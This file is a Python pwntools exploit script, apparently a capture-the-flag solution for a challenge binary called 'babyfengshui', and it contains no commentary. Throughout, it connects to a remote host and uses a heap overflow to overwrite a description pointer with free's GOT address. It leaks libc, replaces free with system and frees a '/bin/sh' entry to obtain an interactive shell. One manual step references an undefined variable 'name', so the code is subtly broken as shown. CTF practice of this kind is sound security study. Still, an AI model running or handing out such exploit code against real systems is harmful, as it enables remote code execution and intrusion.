from pwn import *

def add_user(name, desc):
	s.sendline("0")
	s.recvuntil("description: ")
	s.sendline("%d" % len(desc))
	s.recvuntil("name: ")
	s.sendline(name)
	s.recvuntil("length: ")
	s.sendline("%d" % len(desc))
	s.recvuntil("text: ")
	s.sendline(desc)
	s.recvuntil("Action: ")

def del_user(idx):
	s.sendline("1")
	s.recvuntil("index: ")
	s.sendline("%d" % idx)
	s.recvuntil("Action: ")

#s = process("./babyfengshui")
#print s.proc.pid
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
s = remote("78.46.224.83",1456)
libc = ELF("./libc-2.19.so")

s.recvuntil("Action: ")

add_user(randoms(10),randoms(10))
add_user(randoms(10),randoms(10))
add_user("/bin/sh","/bin/sh")

del_user(0)

s.sendline("0")
s.recvuntil("description: ")
s.sendline("%d" % 120)
s.recvuntil("name: ")
s.sendline(name)
s.recvuntil("length: ")
s.sendline("%d" % 200)
s.recvuntil("text: ")

#set idx1 desc_ptr to free.got
s.sendline(cyclic(152)+p32(0x804b010)) 

s.recvuntil("Action: ")

s.sendline("2")
s.sendline("1")
s.recvuntil("description: ")
buf = s.recvline()

free_ptr = u32(buf[:4])
print hex(free_ptr)

libc_base = free_ptr - libc.sym["free"]
system_ptr = libc_base + libc.sym["system"]
s.recvuntil("Action: ")

s.sendline("3")
s.sendline("1")
s.sendline("4")

s.sendline(p32(system_ptr))
print hex(system_ptr)

s.recvuntil("Action: ")

s.sendline("1")
s.sendline("2")
s.interactive()
